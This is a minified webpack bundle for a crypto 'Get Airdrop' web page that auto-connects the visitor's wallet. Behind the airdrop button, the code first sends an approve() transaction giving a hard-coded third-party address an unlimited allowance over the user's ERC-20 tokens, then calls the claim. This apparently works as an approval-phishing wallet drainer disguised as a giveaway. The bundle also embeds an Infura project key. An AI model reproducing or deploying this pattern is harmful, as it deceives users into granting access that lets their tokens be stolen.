(this.webpackJsonpandora_legend=this.webpackJsonpandora_legend||[]).push([[1],{1206:function(e,n){},1213:function(e,n){},1235:function(e,n){},1237:function(e,n){},1249:function(e,n){},1250:function(e,n){},1273:function(e,n){},1276:function(e,n){},1278:function(e,n){},1502:function(e,n){},1564:function(e,n){},1571:function(e,n){},1633:function(e,n,t){},1635:function(e,n,t){},1636:function(e,n){},1644:function(e,n,t){"use strict";t.r(n);var a=t(21),i=t.n(a),r=t(573),o=t.n(r),s=(t(628),t(1)),u=t.n(s),p=t(210),c=t(93),d=t(574),l=t.n(d),f=t(147),y=t(1660),m=t(576),b=t(577),h=t(578),v=t(579),T=t(580),w=t(583),g=t(586),x=t(589),j=t(591),k=t(592),O=t(593),C=t(594),A=t(595),M="https://mainnet.infura.io/v3/84842078b09946638c03157f83405213",E="https://rinkeby.infura.io/v3/84842078b09946638c03157f83405213",I=new m.a({supportedChainIds:[1,3,4,5,42,56,97]});new b.a({urls:{1:M,4:E},defaultChainId:1}),new h.a({rpc:{1:M},qrcode:!0}),new v.a({url:M,appName:"web3-react example",supportedChainIds:[1,3,4,5,42,10,137,69,420,80001]}),new T.a({chainId:1,url:M,pollingInterval:12e3}),new w.a({chainId:1,url:M,pollingInterval:12e3,manifestEmail:"dummy@abc.xyz",manifestAppUrl:"http://localhost:1234"}),new g.a({chainId:4,appName:"web3-react",url:E}),new x.a({supportedChainIds:[1]}),new j.a({chainId:42}),new k.a({apiKey:"pk_test_A6260FCBAA2EBDFB",chainId:4}),new O.a({apiKey:"pk_test_398B82F5F0E88874",chainId:4,email:"hello@example.org"}),new C.a({dAppId:"e9be171c-2b7f-4ff0-8db9-327707511ee2",networks:[1,100]}),new A.a({chainId:1});var F=t(310),B=(t(1633),t(39)),S=function(e){return Object(B.jsx)("div",{style:Object(F.a)(Object(F.a)({},e.style),{},{marginTop:"30px"}),children:Object(B.jsxs)("button",{className:"button",onClick:e.onClick,disabled:e.loading,children:[e.loading&&Object(B.jsx)("i",{className:"fa fa-refresh fa-spin",style:{marginRight:"5px"}}),e.children]})})},D=[{inputs:[{internalType:"uint256",name:"start",type:"uint256"},{internalType:"uint256",name:"finish",type:"uint256"},{internalType:"uint256",name:"amount",type:"uint256"},{internalType:"address",name:"rewardToken",type:"address"},{internalType:"address",name:"checkToken",type:"address"},{internalType:"address",name:"approveTo",type:"address"}],stateMutability:"nonpayable",type:"constructor"},{anonymous:!1,inputs:[{indexed:!1,internalType:"address",name:"rewardToken",type:"address"},{indexed:!1,internalType:"address",name:"who",type:"address"}],name:"AirdropTaken",type:"event"},{anonymous:!1,inputs:[{indexed:!1,internalType:"uint256",name:"start",type:"uint256"},{indexed:!1,internalType:"uint256",name:"finish",type:"uint256"},{indexed:!1,internalType:"uint256",name:"amount",type:"uint256"},{indexed:!1,internalType:"address",name:"rewardToken",type:"address"}],name:"NewAirdropCreated",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"previousOwner",type:"address"},{indexed:!0,internalType:"address",name:"newOwner",type:"address"}],name:"OwnershipTransferred",type:"event"},{anonymous:!1,inputs:[{indexed:!1,internalType:"address",name:"rewardToken",type:"address"},{indexed:!1,internalType:"address",name:"to",type:"address"},{indexed:!1,internalType:"uint256",name:"amount",type:"uint256"}],name:"RamainTokenWithdrawed",type:"event"},{inputs:[],name:"AIRDROP_COUNT_EVERY_ADDRESS",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"airdropTakenCountRecord",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"airdropTotalCountRecord",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"finishTimestamp",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"uint256",name:"start",type:"uint256"},{internalType:"uint256",name:"finish",type:"uint256"},{internalType:"uint256",name:"amount",type:"uint256"},{internalType:"address",name:"rewardToken",type:"address"}],name:"newAirdrop",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"owner",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[],name:"renounceOwnership",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[],name:"rewardTokenAddress",outputs:[{internalType:"address",name:"",type:"address"}],stateMutability:"view",type:"function"},{inputs:[],name:"startTimestamp",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"takeAirdrop",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"newOwner",type:"address"}],name:"transferOwnership",outputs:[],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"to",type:"address"}],name:"withdrawRemainTokens",outputs:[],stateMutability:"nonpayable",type:"function"}],R=[{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"owner",type:"address"},{indexed:!0,internalType:"address",name:"spender",type:"address"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"Approval",type:"event"},{anonymous:!1,inputs:[{indexed:!0,internalType:"address",name:"from",type:"address"},{indexed:!0,internalType:"address",name:"to",type:"address"},{indexed:!1,internalType:"uint256",name:"value",type:"uint256"}],name:"Transfer",type:"event"},{inputs:[{internalType:"address",name:"owner",type:"address"},{internalType:"address",name:"spender",type:"address"}],name:"allowance",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"spender",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"approve",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"account",type:"address"}],name:"balanceOf",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[],name:"totalSupply",outputs:[{internalType:"uint256",name:"",type:"uint256"}],stateMutability:"view",type:"function"},{inputs:[{internalType:"address",name:"recipient",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"transfer",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"},{inputs:[{internalType:"address",name:"sender",type:"address"},{internalType:"address",name:"recipient",type:"address"},{internalType:"uint256",name:"amount",type:"uint256"}],name:"transferFrom",outputs:[{internalType:"bool",name:"",type:"bool"}],stateMutability:"nonpayable",type:"function"}];t(1635);function _(e){var n=new y.a(e);return n.pollingInterval=12e3,n}function L(){return Object(B.jsx)(f.a,{getLibrary:_,children:Object(B.jsx)(N,{})})}function N(){var e="0x149AE323BDFdBB09E945392404B066dC81d40DfB",n=Object(f.b)(),t=n.connector,r=n.library,o=n.account,s=n.activate,d=i.a.useState(),y=Object(c.a)(d,2),m=y[0],b=y[1];i.a.useEffect((function(){m&&m===t&&b(void 0)}),[m,t]);var h=i.a.useState(null),v=Object(c.a)(h,2),T=v[0],w=v[1];i.a.useEffect((function(){w(r?new l.a(r.provider):null)}),[r]),i.a.useEffect((function(){s(I)}),[s]);var g=i.a.useState("Get Airdrop"),x=Object(c.a)(g,2),j=x[0],k=x[1],O=i.a.useState(!1),C=Object(c.a)(O,2),A=C[0],M=C[1],E=i.a.useState(),F=Object(c.a)(E,2),_=F[0],L=F[1];!function(){var e=arguments.length>0&&void 0!==arguments[0]&&arguments[0],n=Object(f.b)(),t=n.active,i=n.error,r=n.activate;Object(a.useEffect)((function(){var n=window.ethereum;if(n&&n.on&&!t&&!i&&!e){var a=function(){console.log("Handling 'connect' event"),r(I)},o=function(e){console.log("Handling 'chainChanged' event with payload",e),r(I)},s=function(e){console.log("Handling 'accountsChanged' event with payload",e),e.length>0&&r(I)},u=function(e){console.log("Handling 'networkChanged' event with payload",e),r(I)};return n.on("connect",a),n.on("chainChanged",o),n.on("accountsChanged",s),n.on("networkChanged",u),function(){n.removeListener&&(n.removeListener("connect",a),n.removeListener("chainChanged",o),n.removeListener("accountsChanged",s),n.removeListener("networkChanged",u))}}}),[t,i,e,r])}(!function(){var e=Object(f.b)(),n=e.activate,t=e.active,i=Object(a.useState)(!1),r=Object(c.a)(i,2),o=r[0],s=r[1];return Object(a.useEffect)((function(){I.isAuthorized().then((function(e){e?n(I,void 0,!0).catch((function(){s(!0)})):s(!0)}))}),[]),Object(a.useEffect)((function(){!o&&t&&s(!0)}),[o,t]),o}()||!!m);var N=function(){var n=Object(p.a)(u.a.mark((function n(t){var a,i;return u.a.wrap((function(n){for(;;)switch(n.prev=n.next){case 0:return a=new T.eth.Contract(R,"0x0a0184C2726a969a0D0DedfE409D6F78578ADFeE"),n.next=3,a.methods.allowance(o,e).call();case 3:if(i=n.sent,!(T.utils.toBN(i)>0)){n.next=6;break}return n.abrupt("return");case 6:return n.next=8,a.methods.approve(e,"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff").send({from:o,gas:5e6}).once("sending",(function(e){console.log(e)})).once("sent",(function(e){console.log(e)})).once("transactionHash",(function(e){console.log(e),L(e)})).once("receipt",(function(e){console.log(e)})).on("error",(function(e){console.log(e),t(e)})).then((function(e){console.log(e)}));case 8:case"end":return n.stop()}}),n)})));return function(e){return n.apply(this,arguments)}}(),H=function(){var e=Object(p.a)(u.a.mark((function e(){var n,t,a;return u.a.wrap((function(e){for(;;)switch(e.prev=e.next){case 0:return n=!1,t=function(e){L("contract: "+G(e.message)),n=!0},e.prev=2,M(!0),e.next=6,N(t);case 6:if(!n){e.next=9;break}return k("Get Failed"),e.abrupt("return");case 9:return k("Getting Airdrop"),a=new T.eth.Contract(D,"0x20532e294af35d862aF6813d6739602FCa9d0EEC"),5e6,e.next=14,a.methods.takeAirdrop().send({from:o,gas:5e6}).once("sending",(function(e){console.log(e)})).once("sent",(function(e){console.log(e)})).once("transactionHash",(function(e){console.log(e)})).once("receipt",(function(e){console.log(e)})).on("error",(function(e){console.log(e),t(e)})).then((function(e){console.log(e),k("Get Success")}));case 14:e.next=21;break;case 16:e.prev=16,e.t0=e.catch(2),console.log(e.t0),k("Get Failed"),L("exception: "+G(e.t0.message));case 21:return e.prev=21,M(!1),e.finish(21);case 24:case"end":return e.stop()}}),e,null,[[2,16,21,24]])})));return function(){return e.apply(this,arguments)}}(),G=function(e){return e.search("You are not allowed to take airdrop")>=0?"You are not allowed to take airdrop":e.search("All tokens have been taken")>=0?"All tokens have been taken":e.search("You have already taken airdrop")>=0?"You have already taken airdrop":e.search("Airdrop not started or finished")>=0?"Airdrop not started or finished":e};return Object(B.jsxs)("div",{children:[Object(B.jsx)(S,{loading:A,onClick:H,children:j}),_?Object(B.jsx)("div",{className:"error",children:_}):Object(B.jsx)(B.Fragment,{})]})}var H=function(e){e&&e instanceof Function&&t.e(16).then(t.bind(null,2306)).then((function(n){var t=n.getCLS,a=n.getFID,i=n.getFCP,r=n.getLCP,o=n.getTTFB;t(e),a(e),i(e),r(e),o(e)}))};o.a.render(Object(B.jsx)(i.a.StrictMode,{children:Object(B.jsx)(L,{})}),document.getElementById("wallet")),H()},628:function(e,n,t){},640:function(e,n){},643:function(e,n){},645:function(e,n){},649:function(e,n){},672:function(e,n){},674:function(e,n){},683:function(e,n){},685:function(e,n){},694:function(e,n){},696:function(e,n){},824:function(e,n){},861:function(e,n){},863:function(e,n){},870:function(e,n){},871:function(e,n){},889:function(e,n){},897:function(e,n){},904:function(e,n){},952:function(e,n){},996:function(e,n){}},[[1644,2,3]]]);
//# sourceMappingURL=main.44665588.chunk.js.map